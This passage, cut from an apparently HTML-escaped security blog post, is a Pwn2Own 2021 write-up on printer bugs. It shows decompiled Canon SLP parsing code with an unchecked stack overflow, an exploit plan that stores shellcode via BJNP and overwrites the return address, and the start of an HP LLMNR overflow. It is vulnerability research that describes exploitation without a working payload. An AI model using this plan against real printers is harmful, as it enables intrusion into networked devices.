          &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------------[2]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------------------[3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_35:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[4] &lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_40:&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;next_one:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3645&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Scope longer than buffer provided&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_48:&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[3]&lt;/code&gt; is a case that handles no escape characters. It checks whether the length exceeds the maximum&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[4]&lt;/code&gt;. However, in case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; handling escape characters, there is no length check, and the converted result is directly copied to the destination buffer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once given a long escape characters string, it leads to a stack overflow.&lt;/p&gt;

&lt;p&gt;After finding the vulnerability, the first thing is to see what protection it has to decide on the exploit plan. But after analysis, we found that the Canon printer &lt;strong&gt;does not have any memory-related protection&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;protection&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;No DEP&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;No Stack Guard, no DEP and no ASLR, &lt;strong&gt;hacker friendly&lt;/strong&gt; ! Like back to the 90s, just a stack overflow can control the world. Next, like the past stack overflow exploit method, we just need to find a fixed address to store the shellcode, overwrite the return address, and jump to the shellcode. Eventually, we found the &lt;strong&gt;BJNP&lt;/strong&gt; service to store our shellcode.&lt;/p&gt;

&lt;h4 id=&quot;bjnp&quot;&gt;BJNP&lt;/h4&gt;
&lt;p&gt;BJNP is also a service discovery protocol designed by Canon, and there have been many vulnerabilities in the past. &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;Synacktiv&lt;/a&gt; has also exploited Pixma MX925 through this protocol. For more details, please refer to &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#bjnp&quot;&gt;here&lt;/a&gt;. BJNP stores the controllable session data in the global buffer. We can use this function to put our shellcode in a fixed location without strict restrictions.&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Use BJNP to store our shellcode on a global buffer&lt;/li&gt;
  &lt;li&gt;Trigger stack overflow in SLP and overwrite return address&lt;/li&gt;
  &lt;li&gt;Return to the global buffer&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-1&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Generally, the Pwn2Own organizer(ZDI) requests participants to prove that we have pwned the target. The presentation method here is up to players. Initially, we wanted to print the logo directly on the LCD screen as we exploited the Lexmark printer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, we spent a lot of time figuring out how to print the image on the screen, which was longer than finding vulnerabilities and writing exploits. In the end, a safer approach was adopted because of the time constraints, directly changing the &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#service-mode&quot;&gt;Service Mode&lt;/a&gt; string and printing it on the screen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, it is not that difficult to print the image on the screen. Other teams have found &lt;a href=&quot;https://doar-e.github.io/blog/2022/06/11/pwn2own-2021-canon-imageclass-mf644cdw-writeup/#displaying-an-image&quot;&gt;methods&lt;/a&gt;. Those who are interested can try it out :)&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=18400&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;debug&quot;&gt;Debug&lt;/h4&gt;
&lt;p&gt;Some people may wonder how to debug in this environment. There are usually several ways to debug:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Teardown the printer and get debug console.&lt;/li&gt;
  &lt;li&gt;Use an old exploit to install customized debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, we have updated to the latest version at that time. There is no known vulnerability in this version, so we need to downgrade the version back. Tearing down the hardware also takes additional time and cost. But we already had a vulnerability at that time, it was not cost-effective to tear down the hardware or downgrade. Finally, we still used the most traditional sleep debug method.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After ROP or executing shellcode, print the result to a web page or other visible place, then call sleep. We can read the result from the web page and finally restart the machine to repeat this process.&lt;/p&gt;

&lt;p&gt;Next, let’s talk about HP printers.&lt;/p&gt;

&lt;h3 id=&quot;hp-1&quot;&gt;HP&lt;/h3&gt;

&lt;h4 id=&quot;link-local-multicast-name-resolution&quot;&gt;Link-Local Multicast Name Resolution&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution&quot;&gt;LLMNR&lt;/a&gt; is very similar to mDNS. It provides base name resolution on the same local link. But it is more straightforward than mDNS and usually also cooperates with some service discovery protocols. Here is a brief introduction to this mechanism:&lt;/p&gt;

&lt;p&gt;In the domain name resolution of the local area network, Client A will first use multicast to find the location of Client C in the local area network.
&lt;img src=&quot;/assets/img/blog/20231005/19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After Client C receives, Client C sends it back to Client A, which implements the link-local domain name resolution.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LLMNR is mainly based on the &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4795#section-2.1.1&quot;&gt;DNS packet&lt;/a&gt; format, and the format is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The main format is the header followed by Queries, and Count represents the number of queries of different types.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each DNS Query is composed of many labels, and each label will comprise length and string, as shown in the figure above. There is also a &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4&quot;&gt;Message Compression&lt;/a&gt; mechanism. Dealing with these is very prone to vulnerabilities. &lt;a href=&quot;https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-dosSantos-The-Cost-of-Complexity-Different-Vulnerabilities-While-Implementing-the-Same-RFC.pdf&quot;&gt;“THE COST OF COMPLEXITY: Different Vulnerabilities While Implementing the Same RFC”&lt;/a&gt; at BlackHat 2021 also mentions similar problems.&lt;/p&gt;

&lt;h4 id=&quot;vulnerability-1&quot;&gt;Vulnerability&lt;/h4&gt;

&lt;p&gt;Let’s look at HP’s implementation:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;int llmnr_process_query(...){
    char result[292];
    consume_labels(llmnr_packet-&amp;gt;qname,result,...);
    ...
}
&lt;/code&gt;&lt;/pre&gt;
